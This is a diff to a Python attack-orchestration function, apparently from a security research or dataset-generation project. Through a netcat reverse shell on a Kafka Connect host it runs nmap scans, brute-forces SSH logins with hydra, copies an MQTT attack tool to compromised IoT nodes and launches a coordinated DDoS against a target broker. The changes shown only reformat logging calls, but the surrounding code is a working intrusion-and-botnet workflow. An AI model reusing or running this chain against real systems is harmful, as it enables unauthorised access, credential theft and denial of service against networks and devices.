@@ -413,7 +413,8 @@ def rce_via_nc_revshell(att_args: AttackArguments):
         # start nmap scan, create files ips.txt and ssh_ips.txt
         print(
             f"start nmap {att_args.ip_kafka_connect} {datetime.datetime.now(datetime.timezone.utc)}",
-            file=ftimes, flush=True
+            file=ftimes,
+            flush=True,
         )
         att_args.tn.write(f"./transfile.sh sop {att_args.nmap}\n".encode())
         # 24 hours timeout for nmap. If early exit, no data is written, continuing attack is impossible
@@ -423,13 +424,15 @@ def rce_via_nc_revshell(att_args: AttackArguments):
         print(console_output)
         print(
             f"finished nmap {att_args.ip_kafka_connect} {datetime.datetime.now(datetime.timezone.utc)}",
-            file=ftimes, flush=True
+            file=ftimes,
+            flush=True,
         )
         time.sleep(att_args.w_time_nmap_hydra)
 
         print(
             f"start hydra {att_args.ip_kafka_connect} {datetime.datetime.now(datetime.timezone.utc)}",
-            file=ftimes, flush=True
+            file=ftimes,
+            flush=True,
         )
         att_args.tn.write(f"./transfile.sh hyd {att_args.hydra}\n".encode())
         console_output = att_args.tn.read_until(
@@ -440,7 +443,8 @@ def rce_via_nc_revshell(att_args: AttackArguments):
         )
         print(
             f"finished hydra {att_args.ip_kafka_connect} {datetime.datetime.now(datetime.timezone.utc)}",
-            file=ftimes, flush=True
+            file=ftimes,
+            flush=True,
         )
         hydra_output = send_command_via_container(
             att_args.server,
@@ -458,7 +462,8 @@ def rce_via_nc_revshell(att_args: AttackArguments):
 
         print(
             f"start scp transfert file on IoT {att_args.ip_kafka_connect} {datetime.datetime.now(datetime.timezone.utc)}",
-            file=ftimes, flush=True
+            file=ftimes,
+            flush=True,
         )
         att_args.tn.write("./transfile.sh tfl success.txt mqttsa\n".encode())
         console_output = att_args.tn.read_until(
@@ -469,15 +474,16 @@ def rce_via_nc_revshell(att_args: AttackArguments):
         )
         print(
             f"finished scp transfert file on IoT {att_args.ip_kafka_connect} {datetime.datetime.now(datetime.timezone.utc)}",
-            file=ftimes, flush=True
+            file=ftimes,
+            flush=True,
         )
         try:
             att_args.tn.write("\nls\n".encode())
-            print("try ls command on nc revshell", file=ftimes)
+            print("try ls command on nc revshell")
         except OSError as e:
             print(
                 f"Error while writing in revshell after finishing scp transfert \n{e}",
-                file=ftimes, flush=True
+                flush=True,
             )
         try:
             console_output = att_args.tn.read_until(
@@ -486,18 +492,15 @@ def rce_via_nc_revshell(att_args: AttackArguments):
             print(
                 f"Sleeping {att_args.w_time_scp_coordinated_launch} before launching DDoS\n"
                 f"last console output: {console_output}",
-                file=ftimes, flush=True
+                flush=True,
             )
         except EOFError as e:
             print(
                 f"Error while reading from revshell after finishing scp transfert \n{e}",
-                file=ftimes, flush=True
+                flush=True,
             )
         time.sleep(att_args.w_time_scp_coordinated_launch)
-        print(
-            f"Starting DDoS. Try with {count_hydra_success} nodes",
-            file=ftimes, flush=True
-        )
+        print(f"Starting DDoS. Try with {count_hydra_success} nodes", flush=True)
         att_args.tn.write(
             f"./transfile.sh lcmd success.txt /tmp/mqttsa {att_args.mqttsa} {att_args.target_mqtt_broker_ip}\n".encode()
         )
